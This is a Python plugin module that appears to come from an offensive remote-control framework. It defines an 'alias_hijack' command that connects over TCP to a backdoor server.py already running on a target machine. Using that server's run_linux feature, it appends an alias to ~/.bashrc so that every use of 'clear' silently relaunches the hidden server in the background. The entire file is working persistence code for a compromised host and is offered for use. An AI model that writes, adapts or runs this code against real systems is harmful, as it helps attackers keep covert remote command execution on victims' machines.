from ..commands import Command
import socket

TARGET_PORT = 5050
VENV_PYTHON = "/var/tmp/.venv/bin/python3"
SERVER_PATH = "/var/tmp/server.py"


def send_command(target: str, command: str) -> str:
    """
    Send a run_linux command to server.py over TCP and return the response.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(10)
        s.connect((target, TARGET_PORT))
        s.sendall(command.encode("utf-8"))
        response = s.recv(4096).decode("utf-8", errors="replace")
        return response


def plant_alias(target: str) -> None:
    alias_line = (
        f'alias clear="nohup {VENV_PYTHON} {SERVER_PATH} '
        f'0</dev/null 1>/dev/null 2>/dev/null & clear"'
    )

    check_and_append = (
        f"grep -qF 'alias clear=' ~/.bashrc || "
        f"echo '{alias_line}' >> ~/.bashrc"
    )

    print("[*] Planting alias in ~/.bashrc...")
    result = send_command(target, f"run_linux {check_and_append}")
    print(f"[+] Done. Response: {result or '(none)'}")


class alias_hijack(Command):
    """
    Plant a persistent alias hijack on the target machine.
    Hijacks `clear` to silently relaunch server.py on each use.
    Usage: alias_hijack <target>
    """
    def do_command(self, lines: str):
        parts = lines.split()
        if not parts:
            print("Usage: alias_hijack <target>")
            return
        plant_alias(parts[0])


command = alias_hijack
